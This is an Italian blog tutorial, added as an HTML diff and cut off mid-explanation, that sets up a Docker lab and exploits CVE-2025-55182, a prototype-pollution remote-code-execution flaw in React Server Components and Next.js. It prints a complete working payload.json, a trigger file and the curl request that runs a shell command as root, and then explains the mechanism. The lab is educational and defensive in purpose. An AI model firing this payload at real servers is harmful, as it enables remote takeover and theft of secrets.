@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <script>(function(){var t;if(location.search.indexOf('t=l')>-1)t='light';else if(location.search.indexOf('t=d')>-1)t='dark';if(!t)try{t=localStorage.getItem('theme')}catch(e){}document.documentElement.dataset.theme=t||'dark'})()</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Il Prototipo Avvelena il Server | Signal Pirate</title>
+  <meta name="description" content="CVE-2025-55182: un POST e il server Next.js e' tuo. Lab Docker, exploit reale, fix in una riga. Prototype pollution nel Flight protocol di React, CVSS 10.0.">
+  <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+  <link rel="alternate" type="application/rss+xml" title="Signal Pirate" href="../feed.xml">
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+  <!-- Main CSS -->
+  <link rel="stylesheet" href="../css/style.css">
+
+  <style>
+    .insight-box {
+      background: linear-gradient(135deg, rgba(124,77,255,0.1), rgba(0,255,136,0.05));
+      border-left: 3px solid var(--accent-highlight);
+      border-radius: 0 10px 10px 0;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .insight-box p { margin: 0; line-height: 1.6; }
+    .section-number {
+      display: block;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 1rem;
+    }
+    .code-block {
+      background: #0d1117;
+      border: 1px solid rgba(0,255,136,0.12);
+      border-radius: 10px;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      line-height: 1.7;
+      color: #c8c8d8;
+      position: relative;
+    }
+    .code-block::before {
+      content: attr(data-lang);
+      position: absolute;
+      top: 0.5rem;
+      right: 0.8rem;
+      font-size: 0.65rem;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      opacity: 0.5;
+      z-index: 1;
+    }
+    .code-block table { border-collapse: collapse; width: 100%; }
+    .code-block td { padding: 0; vertical-align: top; border: none; }
+    .code-block td:hover { background: none; }
+    .code-block .ln {
+      width: 3.2em;
+      padding: 0.2em 0.8em 0.2em 0.6em;
+      text-align: right;
+      color: #3a3a5a;
+      user-select: none;
+      border-right: 1px solid #1a1a2e;
+      background: #090d14;
+      font-size: 0.72rem;
+    }
+    .code-block .code { padding: 0.2em 0 0.2em 1em; white-space: pre; }
+    .code-block .code-wrap { padding: 0.8rem 0; }
+    .code-block .cm { color: #6a6a8a; }
+    .code-block .kw { color: #7c4dff; }
+    .code-block .st { color: #00ff88; }
+    .code-block .nb { color: #ff8800; }
+    .code-block .fn { color: #4ecdc4; }
+    .code-block .key { color: #ff6b6b; }
+    .code-block .dc { color: #8b949e; font-style: italic; }
+    .warning-box {
+      background: linear-gradient(135deg, rgba(255,107,107,0.1), rgba(255,136,0,0.05));
+      border-left: 3px solid var(--accent-attention);
+      border-radius: 0 10px 10px 0;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .warning-box p { margin: 0; line-height: 1.6; }
+    .conclusion-box {
+      text-align: center;
+      padding: 2rem;
+      margin: 2rem 0;
+      border: 1px solid rgba(0,255,136,0.15);
+      border-radius: 12px;
+      background: linear-gradient(135deg, rgba(124,77,255,0.05), rgba(0,255,136,0.03));
+    }
+    .conclusion-box .quote {
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: var(--accent-highlight);
+      line-height: 1.4;
+    }
+    .stat-card {
+      background: rgba(124,77,255,0.06);
+      border: 1px solid rgba(124,77,255,0.15);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      text-align: center;
+    }
+    .stat-card .stat-value {
+      font-family: var(--font-mono);
+      font-size: 1.4rem;
+      font-weight: 800;
+      color: var(--accent-highlight);
+    }
+    .stat-card .stat-label {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      margin-top: 0.3rem;
+      font-family: var(--font-mono);
+    }
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+    .terminal-output {
+      background: #0a0e16;
+      border: 1px solid rgba(255,107,107,0.2);
+      border-radius: 10px;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      line-height: 1.8;
+      color: #c8c8d8;
+      overflow-x: auto;
+    }
+    .terminal-output .t-prompt { color: #00ff88; }
+    .terminal-output .t-cmd { color: #c8c8d8; }
+    .terminal-output .t-out { color: #8a8aaa; }
+    .terminal-output .t-warn { color: #ff8800; }
+    .terminal-output .t-err { color: #ff6b6b; }
+    .terminal-output .t-ok { color: #00ff88; font-weight: 700; }
+    .terminal-output .t-highlight { color: #ff6b6b; font-weight: 700; }
+    .screenshot-placeholder {
+      border: 2px dashed rgba(124,77,255,0.3);
+      border-radius: 12px;
+      padding: 2rem;
+      margin: 1.5rem 0;
+      text-align: center;
+      color: var(--text-secondary);
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+    }
+    .screenshot-placeholder .screen-num {
+      color: var(--accent-highlight);
+      font-weight: 700;
+      font-size: 1.1rem;
+      margin-bottom: 0.5rem;
+    }
+    .lab-screenshot {
+      border-radius: 12px;
+      border: 1px solid rgba(124,77,255,0.2);
+      margin: 1.5rem 0;
+      max-width: 100%;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    }
+    .chain-flow {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin: 1.5rem 0;
+    }
+    .chain-step {
+      background: rgba(124,77,255,0.08);
+      border: 1px solid rgba(124,77,255,0.2);
+      border-radius: 8px;
+      padding: 0.6rem 1rem;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      text-align: center;
+    }
+    .chain-step .chain-label {
+      font-size: 0.65rem;
+      color: var(--text-secondary);
+      margin-bottom: 0.2rem;
+    }
+    .chain-step .chain-value { color: var(--accent-highlight); font-weight: 700; }
+    .chain-step.chain-danger .chain-value { color: var(--accent-attention); }
+    .chain-arrow { font-size: 1.2rem; color: var(--accent-attention); font-weight: 700; }
+    .proto-diagram {
+      background: #0a0e16;
+      border: 1px solid rgba(124,77,255,0.15);
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin: 1.5rem 0;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      line-height: 2;
+      overflow-x: auto;
+    }
+    .proto-diagram .proto-obj { color: #4ecdc4; }
+    .proto-diagram .proto-prop { color: #c8c8d8; }
+    .proto-diagram .proto-arrow { color: #ff8800; }
+    .proto-diagram .proto-null { color: #3a3a5a; }
+    .strategy-table {
+      width: 100%;
+      border-collapse: separate;
+      border-spacing: 0;
+      margin: 1.5rem 0;
+      font-size: 0.85rem;
+    }
+    .strategy-table th {
+      background: rgba(124,77,255,0.1);
+      padding: 0.8rem 1rem;
+      text-align: left;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--text-secondary);
+      border-bottom: 1px solid rgba(124,77,255,0.2);
+    }
+    .strategy-table td {
+      padding: 0.8rem 1rem;
+      border-bottom: 1px solid rgba(255,255,255,0.04);
+    }
+    .strategy-table tr:hover td { background: rgba(124,77,255,0.03); }
+    .verdict-ok { color: var(--accent-highlight); font-family: var(--font-mono); font-weight: 700; font-size: 0.8rem; }
+    .verdict-fail { color: var(--accent-attention); font-family: var(--font-mono); font-weight: 700; font-size: 0.8rem; }
+  </style>
+</head>
+<body>
+
+<!-- ======================== NAV ======================== -->
+<nav class="nav">
+  <a href="../index.html" class="nav-logo">SIGNAL<span>PIRATE</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Home</a></li>
+    <li><a href="../index.html#articoli">Articoli</a></li>
+    <li><a href="https://github.com/pinperepette" target="_blank" rel="noopener">GitHub</a></li>
+  </ul>
+  <button id="theme-toggle" aria-label="Cambia tema">
+    <svg id="theme-icon-dark" viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+    <svg id="theme-icon-light" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+  </button>
+</nav>
+
+<!-- ======================== HEADER ======================== -->
+<header class="article-header">
+  <p class="article-meta">2026-03-08 | Pinperepette</p>
+  <h1 class="article-page-title">Il Prototipo <span class="accent">Avvelena il Server</span></h1>
+  <p style="font-family: var(--font-mono); font-size: 1rem; color: var(--text-secondary); margin-top: 1rem;">
+    Oggi parliamo di vulnerabilita'. Per farlo, ne prendiamo una vera e la usiamo. Un server Next.js, un curl, e il server e' nostro. Tutto in locale, tutto riproducibile.
+  </p>
+  <div class="article-card-tags" style="justify-content: center; margin-top: 1.5rem;">
+    <span class="tag tag-attention">CVE-2025-55182</span>
+    <span class="tag tag-highlight">Prototype Pollution</span>
+    <span class="tag tag-reaction">React / Next.js</span>
+    <span class="tag">RCE</span>
+    <span class="tag">CVSS 10.0</span>
+  </div>
+</header>
+
+<article class="article-content">
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 01 — LA DOMANDA DELLA IENA                           -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Cosa Facciamo Oggi</h2>
+<span class="section-number">Sezione 01. Il piano</span>
+
+<p>
+  Parlare di sicurezza informatica in astratto non serve a niente. Serve sporcarsi le mani. Quindi oggi facciamo cosi': prendiamo una vulnerabilita' vera, con tanto di CVE, montiamo un server vulnerabile in Docker, lo sfruttiamo con un curl, e poi lo fixiamo. Il tutto sul vostro computer, senza toccare niente che non sia vostro.
+</p>
+
+<p>
+  La vulnerabilita' si chiama <strong>React2Shell</strong>. Ha due CVE: <strong>CVE-2025-55182</strong> (la falla nel decoder di React Server Components, pacchetto <code>react-server-dom</code>) e <strong>CVE-2025-66478</strong> (la manifestazione in Next.js). CVSS 10.0, il massimo. Dicembre 2025. Zero autenticazione richiesta. Un POST e sei root nel container.
+</p>
+
+<div class="stats-grid">
+  <div class="stat-card fade-in">
+    <div class="stat-value">10.0</div>
+    <div class="stat-label">CVSS Score</div>
+  </div>
+  <div class="stat-card fade-in">
+    <div class="stat-value">0</div>
+    <div class="stat-label">Auth richiesta</div>
+  </div>
+  <div class="stat-card fade-in">
+    <div class="stat-value">7M+</div>
+    <div class="stat-label">Download/settimana npm</div>
+  </div>
+  <div class="stat-card fade-in">
+    <div class="stat-value">1 curl</div>
+    <div class="stat-label">Per l'exploit</div>
+  </div>
+</div>
+
+<p>
+  Il piano e' semplice:
+</p>
+
+<ol>
+  <li>Montiamo il lab (Docker, un comando)</li>
+  <li>Verifichiamo che il server e' vulnerabile</li>
+  <li>Lo sfruttiamo con un curl e vediamo il danno</li>
+  <li>Capiamo perche' funziona (la teoria, spiegata dopo averla vista)</li>
+  <li>Applichiamo la fix e verifichiamo che non funziona piu'</li>
+</ol>
+
+<div class="warning-box fade-in">
+  <p><strong>Disclaimer.</strong> Tutto quello che segue si fa in locale, su un container Docker vostro. Non testate mai exploit su sistemi che non vi appartengono. E' illegale e non e' nemmeno divertente.</p>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 02 — MONTIAMO IL LAB                                 -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Montiamo il Lab</h2>
+<span class="section-number">Sezione 02. Docker e via</span>
+
+<p>
+  Nella cartella <a href="https://github.com/pinperepette/blog/tree/main/scripts/react2shell-lab" target="_blank" rel="noopener" style="color: var(--accent-highlight);"><code>scripts/react2shell-lab</code></a> c'e' tutto. Un <code>Dockerfile</code> che crea un'app Next.js 16.0.6 (vulnerabile), un <code>docker-compose.yml</code>, e uno script Python per il check. Ve la faccio breve:
+</p>
+
+<div class="code-block fade-in" data-lang="dockerfile">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="kw">FROM</span> node:20-slim</td></tr>
+<tr><td class="ln">2</td><td class="code"><span class="kw">WORKDIR</span> /app</td></tr>
+<tr><td class="ln">3</td><td class="code"></td></tr>
+<tr><td class="ln">4</td><td class="code"><span class="cm"># Installa Next.js vulnerabile (16.0.6)</span></td></tr>
+<tr><td class="ln">5</td><td class="code"><span class="kw">RUN</span> npx create-next-app@16.0.6 vuln-app --yes --use-npm 2>/dev/null</td></tr>
+<tr><td class="ln">6</td><td class="code"><span class="kw">WORKDIR</span> /app/vuln-app</td></tr>
+<tr><td class="ln">7</td><td class="code"><span class="kw">RUN</span> npm run build</td></tr>
+<tr><td class="ln">8</td><td class="code"><span class="kw">EXPOSE</span> 3000</td></tr>
+<tr><td class="ln">9</td><td class="code"><span class="kw">CMD</span> [<span class="st">"npm"</span>, <span class="st">"run"</span>, <span class="st">"start"</span>]</td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  Un comando e si parte:
+</p>
+
+<div class="code-block fade-in" data-lang="bash">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="kw">cd</span> scripts/react2shell-lab</td></tr>
+<tr><td class="ln">2</td><td class="code">docker compose up --build -d</td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  Qualche minuto di build (la prima volta scarica Node, crea l'app, la compila) e poi:
+</p>
+
+<div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">docker compose up --build -d</span>
+<span class="t-out">#6 [3/5] RUN npx create-next-app@16.0.6 vuln-app --yes --use-npm</span>
+<span class="t-out">#6 2.348 Creating a new Next.js app in /app/vuln-app.</span>
+<span class="t-out">#6 35.41 <span class="t-warn">1 critical severity vulnerability</span></span>
+<span class="t-out">#8 [5/5] RUN npm run build</span>
+<span class="t-out">#8 1.001    ▲ Next.js 16.0.6 (Turbopack)</span>
+<span class="t-out">#8 3.019  ✓ Compiled successfully</span>
+<span class="t-out">Container react2shell-lab  Started</span>
+</div>
+
+<p>
+  Vedete quel "<span style="color: var(--accent-attention);">1 critical severity vulnerability</span>"? npm te lo dice chiaro. E il build va avanti lo stesso.
+</p>
+
+<div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">curl -s -o /dev/null -w "%{http_code}" http://localhost:3000</span>
+<span class="t-ok">200</span>
+</div>
+
+<!-- SCREENSHOT 1: docker compose up --build -->
+<img src="../immagini/react2shell/screen_1.png" alt="Terminale: docker compose up --build con Next.js 16.0.6 e container started" class="lab-screenshot fade-in">
+
+<div class="insight-box fade-in">
+  <p><strong>Cosa c'e' nel container?</strong> Un'app Next.js 16.0.6 vergine. Nessun codice custom, nessuna Server Action, nessuna pagina modificata. La pagina "Welcome to Next.js" di default. E' gia' vulnerabile cosi'. Zero righe scritte da te.</p>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 03 — IL PRIMO TEST                                   -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Il Primo Test</h2>
+<span class="section-number">Sezione 03. Bussare piano</span>
+
+<p>
+  Prima di sfondare la porta, bussiamo. Ho scritto un checker che manda un payload "gentile" al server: esegue solo un <code>throw Error</code>. Non fa danni, non esegue comandi di sistema. Ci dice solo "si', sono vulnerabile, potresti entrarmi dentro quando vuoi".
+</p>
+
+<div class="code-block fade-in" data-lang="bash">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code">python3 check_vuln.py</td></tr>
+</tbody></table></div>
+</div>
+
+<div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">python3 check_vuln.py</span>
+<span class="t-highlight">[!] VULNERABILE  http://localhost:3000</span>
+<span class="t-out">    Il Flight decoder ha eseguito il payload.</span>
+<span class="t-out">    Controlla i log: docker logs react2shell-lab</span>
+<span class="t-out">    Dovresti vedere: Error: CVE-2025-55182-VULNERABLE</span>
+</div>
+
+<p>
+  E nei log del container:
+</p>
+
+<div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">docker logs react2shell-lab 2>&1 | tail -5</span>
+<span class="t-out"> ✓ Ready in 432ms</span>
+<span class="t-err"> ⨯ Error: CVE-2025-55182-VULNERABLE</span>
+<span class="t-out">    at ignore-listed frames {</span>
+<span class="t-out">  digest: '3478860458'</span>
+<span class="t-out">}</span>
+</div>
+
+<p>
+  Quello <code>Error: CVE-2025-55182-VULNERABLE</code> nei log e' il nostro codice. Abbiamo mandato un JSON in un POST, e il server lo ha interpretato come JavaScript e lo ha eseguito. Quel <code>throw Error</code> potrebbe essere <code>rm -rf /</code>. Ci pensi? Noi gli abbiamo mandato un pacchettino educato e lui l'ha aperto e l'ha eseguito senza fare una domanda. Come una iena con i pacchi Amazon: arriva, apre e solo dopo si chiede se era roba sua.
+</p>
+
+<!-- SCREENSHOT 2: check_vuln.py + docker logs -->
+<img src="../immagini/react2shell/screen_2.png" alt="Terminale: check_vuln.py mostra VULNERABILE e docker logs mostra Error CVE-2025-55182-VULNERABLE" class="lab-screenshot fade-in">
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 04 — L'EXPLOIT                                       -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> L'Exploit</h2>
+<span class="section-number">Sezione 04. Sfondare la porta</span>
+
+<p>
+  Ok, il server ci ha detto "sono aperto". Adesso entriamo. Stesso meccanismo del test, ma invece di un <code>throw Error</code> educato, gli diciamo di eseguire <code>id</code> (il comando di sistema che ti dice chi sei sul server) e scrivere il risultato in un file.
+</p>
+
+<p>
+  I file del payload sono gia' nella cartella del lab. Questo e' <code>payload.json</code>:
+</p>
+
+<div class="code-block fade-in" data-lang="payload.json">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code">{</td></tr>
+<tr><td class="ln">2</td><td class="code">  <span class="key">"then"</span>: <span class="st">"$1:__proto__:then"</span>,</td></tr>
+<tr><td class="ln">3</td><td class="code">  <span class="key">"status"</span>: <span class="st">"resolved_model"</span>,</td></tr>
+<tr><td class="ln">4</td><td class="code">  <span class="key">"reason"</span>: <span class="nb">-1</span>,</td></tr>
+<tr><td class="ln">5</td><td class="code">  <span class="key">"value"</span>: <span class="st">"{\"then\": \"$B0\"}"</span>,</td></tr>
+<tr><td class="ln">6</td><td class="code">  <span class="key">"_response"</span>: {</td></tr>
+<tr><td class="ln">7</td><td class="code">    <span class="key">"_prefix"</span>: <span class="st">"process.mainModule.require('child_process').execSync('id > /tmp/pwned');"</span>,</td></tr>
+<tr><td class="ln">8</td><td class="code">    <span class="key">"_formData"</span>: {</td></tr>
+<tr><td class="ln">9</td><td class="code">      <span class="key">"get"</span>: <span class="st">"$1:constructor:constructor"</span></td></tr>
+<tr><td class="ln">10</td><td class="code">    }</td></tr>
+<tr><td class="ln">11</td><td class="code">  }</td></tr>
+<tr><td class="ln">12</td><td class="code">}</td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  E questo e' <code>trigger.txt</code>, una sola riga che attiva la catena:
+</p>
+
+<div class="code-block fade-in" data-lang="trigger.txt">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="st">"$@0"</span></td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  Un curl e via:
+</p>
+
+<div class="code-block fade-in" data-lang="bash">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code">curl -X POST http://localhost:3000 \</td></tr>
+<tr><td class="ln">2</td><td class="code">  -H "Next-Action: dontcare" \</td></tr>
+<tr><td class="ln">3</td><td class="code">  -F "0=&lt;payload.json" \</td></tr>
+<tr><td class="ln">4</td><td class="code">  -F "1=&lt;trigger.txt" \</td></tr>
+<tr><td class="ln">5</td><td class="code">  --max-time 5</td></tr>
+</tbody></table></div>
+</div>
+
+<div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">curl -X POST http://localhost:3000 -H "Next-Action: dontcare" -F "0=&lt;payload.json" -F "1=&lt;trigger.txt" --max-time 5</span>
+<span class="t-err">curl: (28) Operation timed out after 5005 milliseconds with 0 bytes received</span>
+</div>
+
+<p>
+  Timeout. Il server non risponde piu'. Si e' piantato. Bene. Adesso la domanda che conta: il comando e' stato eseguito prima che si piantasse?
+</p>
+
+<div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">docker exec react2shell-lab cat /tmp/pwned</span>
+<span class="t-highlight">uid=0(root) gid=0(root) groups=0(root)</span>
+</div>
+
+<p>
+  <code>uid=0(root)</code>.
+</p>
+
+<p>
+  Root nel processo Node dentro il container. Con un curl. Senza password, senza token, senza cookie, senza niente. Abbiamo mandato un JSON a un'app Next.js appena installata e adesso possiamo eseguire qualsiasi comando.
+</p>
+
+<!-- SCREENSHOT 3: exploit curl + uid=0(root) -->
+<img src="../immagini/react2shell/screen_3.png" alt="Terminale: curl timeout e docker exec mostra uid=0(root) gid=0(root) groups=0(root)" class="lab-screenshot fade-in">
+
+<p>
+  Il timeout non e' un bug del curl. E' un effetto collaterale, ed e' la parte piu' interessante dell'exploit. Vediamo perche'.
+</p>
+
+<p>
+  Il payload scrive una funzione su <code>Object.prototype.then</code>. In JavaScript, il runtime ha una regola: se un oggetto ha una proprieta' <code>.then</code> che e' una funzione, quell'oggetto e' una <strong>thenable</strong>. Lo tratta come una Promise. Non e' un'opinione: e' nella specifica (<a href="https://tc39.es/ecma262/#sec-promise-resolve-functions" target="_blank" rel="noopener" style="color: var(--accent-highlight);">Promise Resolution Procedure</a>).
+</p>
+
+<div class="code-block fade-in" data-lang="javascript">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cm">// Situazione normale</span></td></tr>
+<tr><td class="ln">2</td><td class="code"><span class="kw">const</span> obj = { name: <span class="st">"test"</span> };</td></tr>
+<tr><td class="ln">3</td><td class="code">Promise.resolve(obj);  <span class="cm">// risolve subito, obj non ha .then</span></td></tr>
+<tr><td class="ln">4</td><td class="code"></td></tr>
+<tr><td class="ln">5</td><td class="code"><span class="cm">// Dopo il prototype pollution</span></td></tr>
+<tr><td class="ln">6</td><td class="code">Object.prototype.then = <span class="kw">function</span>(resolve) { resolve(<span class="kw">this</span>); };</td></tr>
+<tr><td class="ln">7</td><td class="code"></td></tr>
+<tr><td class="ln">8</td><td class="code"><span class="kw">const</span> obj2 = { name: <span class="st">"test"</span> };</td></tr>
+<tr><td class="ln">9</td><td class="code">Promise.resolve(obj2);  <span class="cm">// obj2 ha .then (ereditato!) → thenable</span></td></tr>
+<tr><td class="ln">10</td><td class="code"><span class="cm">// il runtime chiama obj2.then(resolve)</span></td></tr>
+<tr><td class="ln">11</td><td class="code"><span class="cm">// resolve riceve obj2 → obj2 ha .then → ricomincia</span></td></tr>
+<tr><td class="ln">12</td><td class="code"><span class="cm">// loop infinito. il server si blocca.</span></td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  Dopo l'avvelenamento, <em>ogni</em> oggetto nel processo Node.js eredita <code>.then</code>. Qualsiasi <code>await</code>, qualsiasi <code>Promise.resolve()</code>, qualsiasi callback asincrona che il framework esegue internamente, innesca il loop: il runtime prova a risolvere l'oggetto, chiama <code>.then</code>, ottiene indietro l'oggetto, vede che ha <code>.then</code>, richiama, e cosi' via. Il server entra in un ciclo infinito di risoluzioni Promise che non convergono mai.
+</p>
+
+<p>
+  Ma il comando (<code>execSync</code>) e' sincrono. Si esegue <em>prima</em> che il runtime arrivi al punto di trattare il risultato come una Promise. Il server muore dopo, non prima. Il timeout del curl e' la conferma che l'exploit ha funzionato.
+</p>
+
+<div class="warning-box fade-in">
+  <p><strong>Quel <code>uid=0(root)</code> in produzione significa game over.</strong> Al posto di <code>id</code> ci metti una reverse shell, leggi le variabili d'ambiente (dove di solito ci sono API key e secret di database), o installi quello che vuoi. Un container che gira come root senza network policy e' un regalo.</p>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 05 — COME FUNZIONA                                   -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Come Funziona</h2>
+<span class="section-number">Sezione 05. Il perche'</span>
+
+<p>
+  Ok, l'abbiamo visto funzionare. Adesso la domanda e': <em>come</em> ha fatto? Torniamo al payload e capiamo cosa succede dentro.
+</p>
+
+<h3>Il Flight Protocol</h3>
+
+<p>
+  React Server Components hanno un loro formato per spedire dati tra browser e server. Si chiama <strong>Flight protocol</strong>. Quando il browser chiama una Server Action, manda un POST con <code>multipart/form-data</code>. Il server prende quel JSON, lo deserializza col Flight decoder, e lo passa alla funzione.
+</p>
+
+<p>
+  Il pezzo di codice che risolve i riferimenti ai moduli e' questo:
+</p>
+
+<div class="code-block fade-in" data-lang="javascript">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cm">// react-server-dom-turbopack (codice vulnerabile)</span></td></tr>
+<tr><td class="ln">2</td><td class="code"><span class="kw">function</span> <span class="fn">requireModule</span>(metadata) {</td></tr>
+<tr><td class="ln">3</td><td class="code">  <span class="kw">var</span> moduleExports = __turbopack_require__(metadata[0]);</td></tr>
+<tr><td class="ln">4</td><td class="code">  <span class="kw">return</span> moduleExports[metadata[<span class="nb">NAME</span>]];  <span class="cm">// &lt;-- nessun check</span></td></tr>
+<tr><td class="ln">5</td><td class="code">}</td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  Riga 4. <code>moduleExports[metadata[NAME]]</code>. Accesso con parentesi quadre, senza controllare cosa c'e' dentro <code>NAME</code>. Se qualcuno ci infila <code>"__proto__"</code>, il codice non accede a una proprieta' dell'oggetto. Risale la catena dei prototipi. Ed e' li' che si rompe tutto.
+</p>
+
+<!-- SCREENSHOT 4: requireModule senza hasOwnProperty -->
+<img src="../immagini/react2shell/screen_4.png" alt="Terminale: grep mostra requireModule senza hasOwnProperty nel container vulnerabile" class="lab-screenshot fade-in">
+
+<h3>Prototype Pollution</h3>
+
+<p>
+  In JavaScript ogni oggetto ha un prototipo, cioe' un altro oggetto da cui eredita roba. Tipo un figlio che eredita il cognome. La catena e' cosi':
+</p>
+
+<div class="proto-diagram fade-in">
+<span class="proto-obj">myObject</span> <span class="proto-prop">{ name: "test" }</span>
+    <span class="proto-arrow">|__ __proto__</span>
+<span class="proto-obj">Object.prototype</span> <span class="proto-prop">{ hasOwnProperty, toString, ... }</span>
+    <span class="proto-arrow">|__ __proto__</span>
+<span class="proto-null">null</span>
+</div>
+
+<p>
+  <strong>Prototype pollution</strong> e' quando riesci a scrivere su <code>Object.prototype</code>. Se ci riesci, <em>tutti</em> gli oggetti nel processo ereditano quella proprieta'. Tutti. Hai toccato il punto da cui dipende tutto il resto.
+</p>
+
+<div class="code-block fade-in" data-lang="javascript">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="kw">const</span> obj = {};</td></tr>
+<tr><td class="ln">2</td><td class="code">obj.__proto__.isAdmin = <span class="nb">true</span>;</td></tr>
+<tr><td class="ln">3</td><td class="code"></td></tr>
+<tr><td class="ln">4</td><td class="code"><span class="kw">const</span> user = {};  <span class="cm">// un oggetto qualsiasi, creato dopo</span></td></tr>
+<tr><td class="ln">5</td><td class="code">console.log(user.isAdmin);  <span class="cm">// true (!)</span></td></tr>
+</tbody></table></div>
+</div>
+
+<p>
+  Hai avvelenato la sorgente. Ogni nuovo oggetto nasce gia' infetto.
+</p>
+
+<h3>La catena di attacco</h3>
+
+<div class="chain-flow fade-in">
+  <div class="chain-step">
+    <div class="chain-label">1</div>
+    <div class="chain-value">HTTP POST</div>
+  </div>
+  <span class="chain-arrow">↓</span>
+  <div class="chain-step">
+    <div class="chain-label">2</div>
+    <div class="chain-value">Flight decoder</div>
+  </div>
+  <span class="chain-arrow">↓</span>
+  <div class="chain-step">
+    <div class="chain-label">3</div>
+    <div class="chain-value">metadata[NAME]</div>
+  </div>
+  <span class="chain-arrow">↓</span>
+  <div class="chain-step chain-danger">
+    <div class="chain-label">4</div>
+    <div class="chain-value">__proto__</div>
+  </div>
+  <span class="chain-arrow">↓</span>
+  <div class="chain-step chain-danger">
+    <div class="chain-label">5</div>
+    <div class="chain-value">Object.prototype pollution</div>
+  </div>
+  <span class="chain-arrow">↓</span>
+  <div class="chain-step chain-danger">
+    <div class="chain-label">6</div>
+    <div class="chain-value">constructor.constructor</div>
+  </div>
+  <span class="chain-arrow">↓</span>
+  <div class="chain-step chain-danger">
+    <div class="chain-label">7</div>
+    <div class="chain-value">Function()</div>
+  </div>
+  <span class="chain-arrow">↓</span>
+  <div class="chain-step chain-danger">
+    <div class="chain-label">8</div>
+    <div class="chain-value">child_process.execSync</div>
+  </div>
+</div>
+
+<p>
+  Il payload adesso ha senso. Guardiamolo:
+</p>
+
+<p>
+  <strong><code>"then": "$1:__proto__:then"</code></strong> — Dice al Flight decoder: "prendi il campo 1, vai a <code>__proto__</code>, poi a <code>then</code>". Il decoder esegue senza fiatare. Non controlla se <code>__proto__</code> e' una proprieta' dell'oggetto. Qui avviene l'avvelenamento.
+</p>
+
+<p>
